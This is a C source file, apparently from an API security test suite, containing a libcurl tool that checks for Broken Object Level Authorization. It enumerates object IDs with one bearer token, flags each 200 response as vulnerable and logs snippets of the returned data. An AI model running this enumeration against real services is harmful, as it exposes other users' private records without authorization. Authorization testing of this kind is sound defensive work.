/*
 * rest_bola.c  -- API1:2023 Broken Object Level Authorization (BOLA)
 *
 * Idea: con UN solo token valido (el del usuario atacante), se recorre un
 * rango de IDs ajenos sobre un endpoint que deberia estar protegido por
 * autorizacion a nivel de objeto (ej: /api/v1/usuarios/{id} o
 * /api/v1/subastas/{id}/pujas). En modo vulnerable, el servidor responde
 * 200 con datos de otros usuarios; en modo blindado debe responder 403/404.
 *
 * Uso:
 *   ./rest_bola <base_url> <plantilla_con_{id}> <token> <id_desde> <id_hasta>
 *
 * Ejemplo:
 *   ./rest_bola http://localhost:8080 "/api/v1/usuarios/{id}" "Bearer eyJ..." 1 50
 *
 * La plantilla puede ser numerica ("1".."50") o se puede adaptar facilmente
 * para UUIDs leyendo una lista desde un archivo (ver rest_bola_lista() abajo).
 */
#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "common.h"

static int intentar_id(CURL *curl, const char *base_url, const char *plantilla,
                        const char *token, long id) {
    char url[1024];
    char idstr[32];
    snprintf(idstr, sizeof(idstr), "%ld", id);

    /* sustituye {id} en la plantilla */
    const char *pos = strstr(plantilla, "{id}");
    if (pos) {
        size_t prefix_len = pos - plantilla;
        snprintf(url, sizeof(url), "%s%.*s%s%s", base_url, (int)prefix_len,
                 plantilla, idstr, pos + 4);
    } else {
        snprintf(url, sizeof(url), "%s%s%s", base_url, plantilla, idstr);
    }

    buffer_t buf;
    buffer_init(&buf);

    struct curl_slist *headers = NULL;
    char authhdr[512];
    snprintf(authhdr, sizeof(authhdr), "Authorization: %s", token);
    headers = curl_slist_append(headers, authhdr);
    headers = curl_slist_append(headers, "Accept: application/json");

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, buffer_write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buf);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);

    CURLcode res = curl_easy_perform(curl);
    long status = 0;
    if (res == CURLE_OK) curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &status);

    const char *resultado = (status == 200) ? "VULNERABLE" :
                             (status == 403 || status == 404) ? "bloqueado" : "?";

    char detalle[160];
    snprintf(detalle, sizeof(detalle), "%.100s", buf.data ? buf.data : "");
    log_result("BOLA/API1", url, status, resultado, detalle);

    curl_slist_free_all(headers);
    buffer_free(&buf);
    return status == 200;
}

int main(int argc, char **argv) {
    if (argc != 6) {
        fprintf(stderr,
            "Uso: %s <base_url> <plantilla_con_{id}> <token> <id_desde> <id_hasta>\n"
            "Ej:  %s http://localhost:8080 \"/api/v1/usuarios/{id}\" \"Bearer xxx\" 1 50\n",
            argv[0], argv[0]);
        return 1;
    }
    const char *base_url = argv[1];
    const char *plantilla = argv[2];
    const char *token = argv[3];
    long desde = atol(argv[4]);
    long hasta = atol(argv[5]);

    curl_global_init(CURL_GLOBAL_DEFAULT);
    CURL *curl = curl_easy_init();
    if (!curl) { fprintf(stderr, "no se pudo iniciar curl\n"); return 1; }

    int expuestos = 0;
    for (long id = desde; id <= hasta; id++) {
        if (intentar_id(curl, base_url, plantilla, token, id)) expuestos++;
    }

    printf("\nResumen BOLA: %d/%ld objetos accesibles con un solo token.\n",
           expuestos, hasta - desde + 1);

    curl_easy_cleanup(curl);
    curl_global_cleanup();
    return 0;
}
